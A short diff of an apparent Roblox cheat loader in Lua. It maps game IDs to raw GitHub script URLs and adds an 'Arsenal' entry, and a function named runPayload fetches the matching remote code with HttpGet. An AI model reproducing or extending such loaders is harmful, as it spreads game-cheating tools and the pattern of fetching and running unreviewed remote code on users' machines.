@@ -43,7 +43,7 @@ local function runPayload()
         [142823291] = "https://raw.githubusercontent.com/shyoma30/Verstik/refs/heads/main/mm2.lua",
         [155615604] = "https://raw.githubusercontent.com/shyoma30/Verstik/refs/heads/main/Prisonlife.lua",
         [107535308163741] = "https://raw.githubusercontent.com/shyoma30/Verstik/refs/heads/main/huss-valley.lua",
-        
+        [286090429] = "https://raw.githubusercontent.com/shyoma30/Verstik/refs/heads/main/Arsenal"
     }
     local url = urls[game.PlaceId] or DEFAULT_URL
     local ok, src = pcall(game.HttpGet, game, url)
